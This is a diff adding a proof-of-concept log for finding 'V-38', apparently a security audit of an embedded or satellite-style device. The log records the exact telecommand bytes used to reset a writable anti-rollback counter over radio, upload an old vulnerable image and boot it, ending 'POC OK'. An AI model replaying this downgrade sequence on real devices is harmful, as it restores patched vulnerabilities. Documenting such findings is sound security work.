@@ -1,0 +1,34 @@
+[   0.000] ========================================================================
+[   0.000] V-38 writable anti-rollback counter
+[   0.000] ========================================================================
+[   0.000] --> TC apid=0x1F via=usb AES  payload=03
+[   0.001] <-- TM apid=0x1F clear len=32
+[   0.001] ARWC=7 enforce=0 sig_req=0 active_slot=0
+[   0.001] --> TC apid=0x1F via=usb AES  payload=0701
+[   0.001] <-- TM apid=0x1F clear len=4
+[   0.001] --> TC apid=0x1F via=radio AES  payload=0400000000
+[   0.002] <-- TM apid=0x1F clear len=4
+[   0.002] --> TC apid=0x1F via=usb AES  payload=03
+[   0.002] <-- TM apid=0x1F clear len=32
+[   0.002] after attacker write: ARWC=0 (enforce bit=1)
+[   0.002] --> TC apid=0x1F via=usb AES  payload=05
+[   0.003] <-- TM apid=0x1F clear len=4
+[   0.003] --> TC apid=0x1F via=usb AES  payload=03
+[   0.003] <-- TM apid=0x1F clear len=32
+[   0.003] --> TC apid=0x1F via=radio AES  payload=0000000000125d4c4f4c442d56554c4e455241424c452d494d47
+[   0.004] <-- TM apid=0x1F clear len=5
+[   0.004] --> TC apid=0x1F via=radio AES  payload=01
+[   0.004] <-- TM apid=0x1F clear len=4
+[   0.004] --> TC apid=0x02 via=radio AES  payload=-
+[   0.005] <-- TM apid=0x02 clear len=4
+[   0.005] --> TC apid=0x1F via=usb AES  payload=03
+[   0.005] <-- TM apid=0x1F clear len=32
+[   0.005] booted_slot=1 pending=1 -> old image runs, ARWC still 0
+[   0.005] --> TC apid=0x1F via=usb AES  payload=02
+[   0.006] <-- TM apid=0x1F clear len=4
+[   0.006] --> TC apid=0x1F via=usb AES  payload=03
+[   0.007] <-- TM apid=0x1F clear len=32
+[   0.007] => patch level is unenforceable: every fixed CVE comes back with one TC + one reboot
+[   0.007] ========================================================================
+[   0.007] POC OK
+[   0.007] ========================================================================
